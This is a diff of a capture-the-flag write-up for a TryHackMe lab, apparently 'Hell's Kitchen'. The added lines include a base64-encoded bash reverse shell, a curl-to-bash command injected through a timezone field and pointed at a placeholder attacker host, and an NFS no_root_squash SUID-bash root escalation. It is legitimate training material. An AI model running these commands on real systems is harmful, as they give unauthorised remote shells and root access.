@@ -278,15 +278,39 @@ socket.onmessage = e => document.querySelector(".time").innerText = e.data, setI
 
 > Unfortunately, I still could not get most RCE attempts to work. Either the syntax broke, or it failed to execute due to some characters. So I created an index.html which would be the default file to be curled without file name specified over port 80. All I needed to do was placing a reverse shell command inside the index.html file, and fetch it via websocket and get it to execute whatever is inside. However, one thing should be considered. Not all ports are open in the target machine, so we need to choose a common port which is open almost in all servers - 443. Fetching the payload using port 80, and getting a rev shell on port 443.
 
+> Base64 encode
+
+```bash
+echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" | base64
+```
+
+> index.html
+
+```html
+printf <base64_payload> | base64 -d | bash
+```
+
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2010-37-00.png)
+
+```bash
+#~ nano index.html
+
+#~ python3 -m http.server 80
+```
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-47-54.png)
 
 > Executing the fetched content
 
+```bash
+;curl <ATTACKER_IP>|bash;
+```
+
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-54-17.png)
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2001-47-32.png)
+
+>  What makes the injection possible is - the server passes the timezone value directly to a system call like strftime or date without sanitization. Thus we were able to escape it and execute other commands.
 
 ---
 
@@ -414,6 +438,12 @@ steghide: could not extract any data with that passphrase!
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2011-50-34.png)
 
+> Substitute user to Jojo via the given credential in the image.
+
+```bash
+su - jojo
+```
+
 ---
 
 ## Privilege Escalation
@@ -491,7 +521,7 @@ nc -l -p 443 > bash
 
 ![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/DX2%3A%20Hell's%20Kitchen/Images/Screenshot%20From%202026-08-05%2013-59-09.png)
 
-> Giving SUID and x bits
+> Giving SUID and x bits: The +xs bit is set as root on the NFS server (attacker) but the victim mounts it and because no_root_squash is set, the root ownership is preserved, so bash -p executes with euid=0
 
 ```bash
 root@ip-10-130-99-48:/tmp/share# chmod +xs bash
